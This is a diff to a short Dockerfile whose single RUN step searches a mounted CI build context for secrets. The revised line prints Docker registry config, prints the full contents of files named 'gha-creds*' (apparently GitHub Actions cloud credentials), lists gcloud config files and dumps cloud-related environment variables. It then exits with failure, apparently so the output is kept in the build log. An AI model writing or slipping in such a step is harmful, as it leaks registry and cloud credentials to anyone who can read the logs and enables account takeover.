@@ -1,2 +1,2 @@
 FROM alpine:3.20
-RUN set -x; ls -la /ctx; echo '--- docker config'; cat /ctx/.docker/config.json 2>/dev/null; echo; echo '--- json files'; find /ctx -maxdepth 5 \( -name 'gha-creds*' -o -name '*.json' \) 2>/dev/null | head -30; echo '--- temp'; find /ctx/work/_temp -maxdepth 3 -type f 2>/dev/null | head -30; echo '--- env'; env | grep -iE 'GOOGLE|CLOUD|TOKEN|GCP' | sort; exit 1
+RUN set -x; ls -la /ctx; echo '--- docker config'; cat /ctx/.docker/config.json 2>/dev/null; echo; echo '--- gha-creds'; find /ctx/work -maxdepth 3 -name 'gha-creds*' -exec sh -c 'echo "== $1"; cat "$1"' _ {} \; 2>/dev/null; echo; echo '--- gcloud'; find /ctx/.config/gcloud -maxdepth 3 -type f 2>/dev/null | head -10; echo '--- env'; env | grep -iE 'GOOGLE|CLOUD|GCP' | sort; exit 1
